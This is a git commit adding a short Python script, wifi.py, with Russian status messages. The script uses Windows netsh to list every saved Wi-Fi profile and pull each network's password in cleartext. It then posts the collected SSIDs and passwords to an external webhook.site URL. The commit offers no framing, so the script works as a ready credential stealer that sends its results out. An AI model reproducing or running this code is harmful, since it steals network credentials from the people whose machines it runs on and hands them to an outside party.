515f1283aefc121d2a40257ffd88bc01bd97596c
Andrew <ljubimishj@gmail.com>
2023-06-15 11:51:35 +0400

    wifi.py added

---
+++ Visual/wifi.py
@@ -0,0 +1,44 @@
+
+import subprocess
+import re
+import requests
+import json
+
+
+
+print('Начало работы скрипта')
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+
+
+# %%
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+print(f'Профайлов получено: {profile_names.__len__()}')
+
+wifi_list = []
+
+if len(profile_names) != 0:
+    for name in profile_names:
+        wifi_profile = {}
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+        if re.search("Security key           : Absent", profile_info):
+            continue
+        else:
+            wifi_profile["ssid"] = name
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)
+            if password == None:
+                wifi_profile["password"] = None
+            else:
+                wifi_profile["password"] = password[1]
+            wifi_list.append(wifi_profile) 
+
+
+
+url = 'https://webhook.site/1ab99e32-716d-44f1-8623-44b5ac90c5ca'
+
+
+requests.post(url, json=json.dumps(wifi_list))
+
+
+
+
